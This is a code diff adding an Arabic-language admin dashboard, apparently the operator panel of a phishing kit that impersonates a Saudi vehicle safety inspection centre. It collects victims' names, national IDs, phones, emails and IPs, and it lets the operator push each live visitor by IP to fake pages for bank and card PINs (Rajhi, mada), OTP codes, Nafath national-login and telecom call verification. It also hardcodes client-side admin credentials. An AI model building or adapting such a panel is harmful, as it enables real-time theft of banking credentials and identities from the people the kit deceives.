@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>لوحة التحكم | مركز سلامة المركبات</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" />
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+  <style>
+    :root {
+      --primary: #146394;
+      --secondary: #1a7abf;
+      --success: #198754;
+      --dark: #0d1b2a;
+      --sidebar-width: 260px;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f4f8; color: #333; }
+
+    /* Login Screen */
+    #loginScreen {
+      position: fixed; inset: 0; background: linear-gradient(135deg, #0d1b2a, #146394);
+      display: flex; align-items: center; justify-content: center; z-index: 9999;
+    }
+    .login-box {
+      background: white; border-radius: 16px; padding: 40px; width: 360px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    }
+    .login-box h2 { color: var(--primary); margin-bottom: 8px; font-size: 1.5rem; }
+    .login-box p { color: #888; margin-bottom: 24px; font-size: 0.9rem; }
+    .login-box input {
+      width: 100%; padding: 12px 16px; border: 1px solid #ddd; border-radius: 8px;
+      margin-bottom: 16px; font-size: 1rem; direction: ltr;
+    }
+    .login-box button {
+      width: 100%; padding: 12px; background: var(--primary); color: white;
+      border: none; border-radius: 8px; font-size: 1rem; cursor: pointer; transition: 0.2s;
+    }
+    .login-box button:hover { background: var(--secondary); }
+    .login-error { color: red; font-size: 0.85rem; margin-top: 8px; display: none; }
+
+    /* Sidebar */
+    #sidebar {
+      position: fixed; top: 0; right: 0; width: var(--sidebar-width); height: 100vh;
+      background: var(--dark); color: white; display: flex; flex-direction: column;
+      z-index: 100; transition: 0.3s;
+    }
+    .sidebar-header {
+      padding: 20px; border-bottom: 1px solid rgba(255,255,255,0.1);
+      display: flex; align-items: center; gap: 12px;
+    }
+    .sidebar-header img { width: 40px; height: 40px; border-radius: 8px; }
+    .sidebar-header h3 { font-size: 0.95rem; line-height: 1.3; }
+    .sidebar-header span { font-size: 0.75rem; color: #aaa; }
+    .nav-menu { flex: 1; padding: 16px 0; overflow-y: auto; }
+    .nav-item {
+      display: flex; align-items: center; gap: 12px; padding: 12px 20px;
+      cursor: pointer; transition: 0.2s; border-right: 3px solid transparent;
+      font-size: 0.9rem; color: #ccc;
+    }
+    .nav-item:hover { background: rgba(255,255,255,0.07); color: white; }
+    .nav-item.active { background: rgba(20,99,148,0.3); border-right-color: var(--secondary); color: white; }
+    .nav-item i { font-size: 1.1rem; width: 20px; text-align: center; }
+    .sidebar-footer { padding: 16px 20px; border-top: 1px solid rgba(255,255,255,0.1); }
+    .connection-status {
+      display: flex; align-items: center; gap: 8px; font-size: 0.8rem; color: #aaa;
+    }
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #dc3545; }
+    .status-dot.connected { background: #198754; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+
+    /* Main Content */
+    #mainContent {
+      margin-right: var(--sidebar-width); padding: 24px; min-height: 100vh;
+    }
+    .page { display: none; }
+    .page.active { display: block; }
+    .page-header { margin-bottom: 24px; }
+    .page-header h1 { font-size: 1.5rem; color: var(--dark); font-weight: 700; }
+    .page-header p { color: #888; font-size: 0.9rem; }
+
+    /* Stats Cards */
+    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px; }
+    .stat-card {
+      background: white; border-radius: 12px; padding: 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06); display: flex; align-items: center; gap: 16px;
+    }
+    .stat-icon {
+      width: 52px; height: 52px; border-radius: 12px; display: flex;
+      align-items: center; justify-content: center; font-size: 1.4rem;
+    }
+    .stat-icon.blue { background: #e3f2fd; color: #1565c0; }
+    .stat-icon.green { background: #e8f5e9; color: #2e7d32; }
+    .stat-icon.orange { background: #fff3e0; color: #e65100; }
+    .stat-icon.purple { background: #f3e5f5; color: #6a1b9a; }
+    .stat-value { font-size: 1.8rem; font-weight: 700; color: var(--dark); }
+    .stat-label { font-size: 0.8rem; color: #888; }
+
+    /* Table */
+    .card {
+      background: white; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+      overflow: hidden; margin-bottom: 24px;
+    }
+    .card-header {
+      padding: 16px 20px; border-bottom: 1px solid #f0f0f0;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .card-header h3 { font-size: 1rem; font-weight: 600; color: var(--dark); }
+    .card-body { padding: 0; overflow-x: auto; }
+    table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+    th { background: #f8f9fa; padding: 12px 16px; text-align: right; font-weight: 600; color: #555; border-bottom: 1px solid #eee; }
+    td { padding: 12px 16px; border-bottom: 1px solid #f5f5f5; color: #444; }
+    tr:hover td { background: #fafafa; }
+    .badge { padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 500; }
+    .badge-online { background: #d4edda; color: #155724; }
+    .badge-offline { background: #f8d7da; color: #721c24; }
+
+    /* Visitors */
+    .visitors-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; }
+    .visitor-card {
+      background: white; border-radius: 12px; padding: 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06); border-right: 4px solid var(--primary);
+    }
+    .visitor-card .ip { font-weight: 700; font-size: 1rem; color: var(--dark); direction: ltr; }
+    .visitor-card .page-name { color: #888; font-size: 0.85rem; margin: 4px 0 12px; }
+    .visitor-actions { display: flex; gap: 8px; flex-wrap: wrap; }
+    .btn-nav {
+      padding: 6px 12px; border: none; border-radius: 6px; cursor: pointer;
+      font-size: 0.8rem; transition: 0.2s; background: #e3f2fd; color: #1565c0;
+    }
+    .btn-nav:hover { background: #1565c0; color: white; }
+
+    /* Refresh btn */
+    .btn-refresh {
+      padding: 8px 16px; background: var(--primary); color: white; border: none;
+      border-radius: 8px; cursor: pointer; font-size: 0.85rem; display: flex; align-items: center; gap: 6px;
+    }
+    .btn-refresh:hover { background: var(--secondary); }
+
+    /* Empty state */
+    .empty-state { text-align: center; padding: 48px; color: #aaa; }
+    .empty-state i { font-size: 3rem; margin-bottom: 12px; display: block; }
+
+    /* Toast */
+    #toast {
+      position: fixed; bottom: 24px; left: 24px; background: #333; color: white;
+      padding: 12px 20px; border-radius: 8px; font-size: 0.85rem; z-index: 9999;
+      transform: translateY(100px); transition: 0.3s; opacity: 0;
+    }
+    #toast.show { transform: translateY(0); opacity: 1; }
+
+    @media (max-width: 768px) {
+      #sidebar { width: 100%; height: auto; position: relative; }
+      #mainContent { margin-right: 0; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Login Screen -->
+<div id="loginScreen">
+  <div class="login-box">
+    <h2><i class="bi bi-shield-lock"></i> لوحة التحكم</h2>
+    <p>مركز سلامة المركبات</p>
+    <input type="text" id="loginUser" placeholder="اسم المستخدم" />
+    <input type="password" id="loginPass" placeholder="كلمة المرور" />
+    <button onclick="doLogin()">دخول</button>
+    <div class="login-error" id="loginError">اسم المستخدم أو كلمة المرور غير صحيحة</div>
+  </div>
+</div>
+
+<!-- Sidebar -->
+<div id="sidebar">
+  <div class="sidebar-header">
+    <div>
+      <h3>لوحة التحكم</h3>
+      <span>مركز سلامة المركبات</span>
+    </div>
+  </div>
+  <nav class="nav-menu">
+    <div class="nav-item active" onclick="showPage('dashboard')">
+      <i class="bi bi-speedometer2"></i> الرئيسية
+    </div>
+    <div class="nav-item" onclick="showPage('bookings')">
+      <i class="bi bi-calendar-check"></i> الحجوزات
+    </div>
+    <div class="nav-item" onclick="showPage('visitors')">
+      <i class="bi bi-people"></i> الزوار المتصلون
+    </div>
+    <div class="nav-item" onclick="showPage('navigate')">
+      <i class="bi bi-arrow-left-right"></i> التحكم في التوجيه
+    </div>
+  </nav>
+  <div class="sidebar-footer">
+    <div class="connection-status">
+      <div class="status-dot" id="statusDot"></div>
+      <span id="statusText">جاري الاتصال...</span>
+    </div>
+  </div>
+</div>
+
+<!-- Main Content -->
+<div id="mainContent">
+
+  <!-- Dashboard -->
+  <div class="page active" id="page-dashboard">
+    <div class="page-header">
+      <h1>الرئيسية</h1>
+      <p>نظرة عامة على النظام</p>
+    </div>
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-icon blue"><i class="bi bi-calendar-check"></i></div>
+        <div>
+          <div class="stat-value" id="stat-total">-</div>
+          <div class="stat-label">إجمالي الحجوزات</div>
+        </div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon green"><i class="bi bi-calendar-day"></i></div>
+        <div>
+          <div class="stat-value" id="stat-today">-</div>
+          <div class="stat-label">حجوزات اليوم</div>
+        </div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon orange"><i class="bi bi-people"></i></div>
+        <div>
+          <div class="stat-value" id="stat-visitors">0</div>
+          <div class="stat-label">زوار متصلون الآن</div>
+        </div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon purple"><i class="bi bi-wifi"></i></div>
+        <div>
+          <div class="stat-value" id="stat-status">-</div>
+          <div class="stat-label">حالة السيرفر</div>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <h3>آخر الحجوزات</h3>
+        <button class="btn-refresh" onclick="loadBookings()"><i class="bi bi-arrow-clockwise"></i> تحديث</button>
+      </div>
+      <div class="card-body">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>الاسم</th>
+              <th>الهاتف</th>
+              <th>المنطقة</th>
+              <th>نوع الخدمة</th>
+              <th>التاريخ</th>
+              <th>الوقت</th>
+            </tr>
+          </thead>
+          <tbody id="dashBookingsTable">
+            <tr><td colspan="7" class="empty-state"><i class="bi bi-inbox"></i>جاري التحميل...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bookings -->
+  <div class="page" id="page-bookings">
+    <div class="page-header">
+      <h1>الحجوزات</h1>
+      <p>جميع الحجوزات المسجلة في النظام</p>
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <h3>قائمة الحجوزات</h3>
+        <button class="btn-refresh" onclick="loadBookings()"><i class="bi bi-arrow-clockwise"></i> تحديث</button>
+      </div>
+      <div class="card-body">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>الاسم</th>
+              <th>رقم الهوية</th>
+              <th>الهاتف</th>
+              <th>البريد</th>
+              <th>الجنسية</th>
+              <th>المنطقة</th>
+              <th>نوع الخدمة</th>
+              <th>التاريخ</th>
+              <th>الوقت</th>
+              <th>IP</th>
+              <th>تاريخ التسجيل</th>
+            </tr>
+          </thead>
+          <tbody id="bookingsTable">
+            <tr><td colspan="12" class="empty-state"><i class="bi bi-inbox"></i>جاري التحميل...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- Visitors -->
+  <div class="page" id="page-visitors">
+    <div class="page-header">
+      <h1>الزوار المتصلون</h1>
+      <p>الزوار المتصلون بالموقع الآن</p>
+    </div>
+    <div id="visitorsContainer">
+      <div class="empty-state"><i class="bi bi-wifi-off"></i>لا يوجد زوار متصلون حالياً</div>
+    </div>
+  </div>
+
+  <!-- Navigate -->
+  <div class="page" id="page-navigate">
+    <div class="page-header">
+      <h1>التحكم في التوجيه</h1>
+      <p>توجيه الزوار إلى صفحات محددة</p>
+    </div>
+    <div class="card">
+      <div class="card-header"><h3>إرسال أمر توجيه</h3></div>
+      <div class="card-body" style="padding: 24px;">
+        <div class="row g-3">
+          <div class="col-md-4">
+            <label class="form-label">عنوان IP الزائر</label>
+            <input type="text" class="form-control" id="navIp" placeholder="مثال: 197.46.244.133" dir="ltr" />
+          </div>
+          <div class="col-md-4">
+            <label class="form-label">الصفحة المستهدفة</label>
+            <select class="form-select" id="navPage">
+              <option value="home">home - الصفحة الرئيسية</option>
+              <option value="booking">booking - الحجز</option>
+              <option value="payments">payments - الدفع</option>
+              <option value="phone">phone - رقم الهاتف</option>
+              <option value="pin">pin - رمز PIN</option>
+              <option value="code">code - الكود</option>
+              <option value="whats">whats - واتساب</option>
+              <option value="nafad">nafad - نفاذ</option>
+              <option value="nafadBasmah">nafadBasmah - نفاذ بصمة</option>
+              <option value="rajhi">rajhi - الراجحي</option>
+              <option value="rajhiCode">rajhiCode - كود الراجحي</option>
+              <option value="madaPin">madaPin - مدى PIN</option>
+              <option value="phoneCode">phoneCode - كود الهاتف</option>
+              <option value="bCall">bCall - مكالمة</option>
+              <option value="stcCall">stcCall - مكالمة STC</option>
+              <option value="mobilyCall">mobilyCall - مكالمة موبايلي</option>
+            </select>
+          </div>
+          <div class="col-md-4 d-flex align-items-end">
+            <button class="btn-refresh w-100" onclick="sendNavigate()">
+              <i class="bi bi-send"></i> إرسال الأمر
+            </button>
+          </div>
+        </div>
+        <hr class="my-4" />
+        <h5 class="mb-3">توجيه سريع للزوار المتصلين</h5>
+        <div id="quickNavContainer">
+          <div class="empty-state"><i class="bi bi-wifi-off"></i>لا يوجد زوار متصلون</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<div id="toast"></div>
+
+<script>
+  const SERVER_URL = 'https://vsafety-server-production.up.railway.app';
+  const ADMIN_USER = 'admin';
+  const ADMIN_PASS = 'Vsafety@2024';
+
+  let socket = null;
+  let visitors = {};
+  let bookings = [];
+  let isLoggedIn = false;
+
+  function doLogin() {
+    const user = document.getElementById('loginUser').value.trim();
+    const pass = document.getElementById('loginPass').value.trim();
+    if (user === ADMIN_USER && pass === ADMIN_PASS) {
+      document.getElementById('loginScreen').style.display = 'none';
+      isLoggedIn = true;
+      initSocket();
+      loadBookings();
+    } else {
+      document.getElementById('loginError').style.display = 'block';
+    }
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Enter' && !isLoggedIn) doLogin();
+  });
+
+  function initSocket() {
+    socket = io(SERVER_URL, {
+      transports: ['websocket'],
+      auth: { role: 'admin' }
+    });
+
+    socket.on('connect', () => {
+      document.getElementById('statusDot').classList.add('connected');
+      document.getElementById('statusText').textContent = 'متصل';
+      document.getElementById('stat-status').textContent = 'يعمل';
+      showToast('تم الاتصال بالسيرفر ✓');
+      socket.emit('getVisitors');
+    });
+
+    socket.on('disconnect', () => {
+      document.getElementById('statusDot').classList.remove('connected');
+      document.getElementById('statusText').textContent = 'غير متصل';
+      document.getElementById('stat-status').textContent = 'منقطع';
+    });
+
+    socket.on('visitorsList', (data) => {
+      visitors = {};
+      data.forEach(v => { visitors[v.ip] = v; });
+      renderVisitors();
+    });
+
+    socket.on('visitorUpdate', (data) => {
+      visitors[data.ip] = data;
+      renderVisitors();
+    });
+
+    socket.on('visitorLeft', (ip) => {
+      delete visitors[ip];
+      renderVisitors();
+    });
+
+    socket.on('bookingsList', (data) => {
+      bookings = data;
+      renderBookings();
+    });
+
+    socket.on('navigateResult', (data) => {
+      showToast(data.success ? 'تم إرسال أمر التوجيه ✓' : 'فشل إرسال الأمر ✗');
+    });
+  }
+
+  function loadBookings() {
+    if (socket && socket.connected) {
+      socket.emit('getBookings');
+    } else {
+      fetch(SERVER_URL + '/api/bookings')
+        .then(r => r.json())
+        .then(data => { bookings = data; renderBookings(); })
+        .catch(() => showToast('تعذر تحميل الحجوزات'));
+    }
+  }
+
+  function renderBookings() {
+    const today = new Date().toISOString().split('T')[0];
+    const todayCount = bookings.filter(b => b.created_at && b.created_at.startsWith(today)).length;
+
+    document.getElementById('stat-total').textContent = bookings.length;
+    document.getElementById('stat-today').textContent = todayCount;
+
+    // Dashboard table (last 10)
+    const dashTbody = document.getElementById('dashBookingsTable');
+    const fullTbody = document.getElementById('bookingsTable');
+
+    if (bookings.length === 0) {
+      const empty = '<tr><td colspan="12" class="empty-state"><i class="bi bi-inbox"></i> لا توجد حجوزات بعد</td></tr>';
+      dashTbody.innerHTML = empty;
+      fullTbody.innerHTML = empty;
+      return;
+    }
+
+    const rows = bookings.slice().reverse().map((b, i) => `
+      <tr>
+        <td>${bookings.length - i}</td>
+        <td>${b.name || '-'}</td>
+        <td>${b.national_id || '-'}</td>
+        <td dir="ltr">${b.phone_number || '-'}</td>
+        <td>${b.email || '-'}</td>
+        <td>${b.nationality || '-'}</td>
+        <td>${b.region || '-'}</td>
+        <td>${b.service_type || '-'}</td>
+        <td>${b.date_svc || '-'}</td>
+        <td>${b.time_svc || '-'}</td>
+        <td dir="ltr" style="font-size:0.75rem">${b.ip || '-'}</td>
+        <td style="font-size:0.75rem">${b.created_at ? new Date(b.created_at).toLocaleString('ar-SA') : '-'}</td>
+      </tr>
+    `);
+
+    fullTbody.innerHTML = rows.join('');
+    dashTbody.innerHTML = rows.slice(0, 10).map(r => {
+      const cells = r.match(/<td[^>]*>(.*?)<\/td>/g);
+      return `<tr>${[cells[0], cells[1], cells[3], cells[6], cells[7], cells[8], cells[9]].join('')}</tr>`;
+    }).join('');
+  }
+
+  function renderVisitors() {
+    const list = Object.values(visitors);
+    document.getElementById('stat-visitors').textContent = list.length;
+
+    const container = document.getElementById('visitorsContainer');
+    const quickNav = document.getElementById('quickNavContainer');
+
+    const pages = ['home','booking','payments','phone','pin','code','whats','nafad','nafadBasmah','rajhi','rajhiCode','madaPin','phoneCode','bCall','stcCall','mobilyCall'];
+
+    if (list.length === 0) {
+      container.innerHTML = '<div class="empty-state"><i class="bi bi-wifi-off"></i>لا يوجد زوار متصلون حالياً</div>';
+      quickNav.innerHTML = '<div class="empty-state"><i class="bi bi-wifi-off"></i>لا يوجد زوار متصلون</div>';
+      return;
+    }
+
+    container.innerHTML = '<div class="visitors-grid">' + list.map(v => `
+      <div class="visitor-card">
+        <div class="ip">${v.ip}</div>
+        <div class="page-name"><i class="bi bi-geo-alt"></i> الصفحة الحالية: <strong>${v.page || 'غير معروف'}</strong></div>
+        <div class="visitor-actions">
+          ${pages.map(p => `<button class="btn-nav" onclick="navigateTo('${v.ip}','${p}')">${p}</button>`).join('')}
+        </div>
+      </div>
+    `).join('') + '</div>';
+
+    quickNav.innerHTML = '<div class="visitors-grid">' + list.map(v => `
+      <div class="visitor-card">
+        <div class="ip">${v.ip}</div>
+        <div class="page-name">الصفحة: <strong>${v.page || '-'}</strong></div>
+        <div class="visitor-actions">
+          ${pages.slice(0,8).map(p => `<button class="btn-nav" onclick="navigateTo('${v.ip}','${p}')">${p}</button>`).join('')}
+        </div>
+      </div>
+    `).join('') + '</div>';
+  }
+
+  function navigateTo(ip, page) {
+    if (!socket || !socket.connected) { showToast('غير متصل بالسيرفر'); return; }
+    socket.emit('adminNavigate', { ip, page });
+    showToast(`جاري توجيه ${ip} إلى ${page}...`);
+  }
+
+  function sendNavigate() {
+    const ip = document.getElementById('navIp').value.trim();
+    const page = document.getElementById('navPage').value;
+    if (!ip) { showToast('يرجى إدخال عنوان IP'); return; }
+    navigateTo(ip, page);
+  }
+
+  function showPage(name) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    document.getElementById('page-' + name).classList.add('active');
+    event.currentTarget.classList.add('active');
+    if (name === 'bookings') loadBookings();
+    if (name === 'visitors') renderVisitors();
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 3000);
+  }
+
+  // Auto-refresh every 30s
+  setInterval(() => { if (isLoggedIn) loadBookings(); }, 30000);
+</script>
+</body>
+</html>
